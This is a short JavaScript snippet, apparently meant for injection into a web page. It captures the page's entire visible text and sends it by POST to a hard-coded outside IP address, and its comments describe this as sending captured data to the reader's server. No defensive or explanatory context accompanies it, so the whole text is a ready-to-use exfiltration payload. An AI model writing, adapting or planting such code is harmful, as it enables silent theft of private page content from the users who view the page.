// This will send the captured data to your server
let data = document.body.innerText;
fetch("http://185.196.11.208:8000/log", {  // Send to your server
  method: "POST",
  body: "content=" + encodeURIComponent(data),
  headers: { "Content-Type": "application/x-www-form-urlencoded" }
});
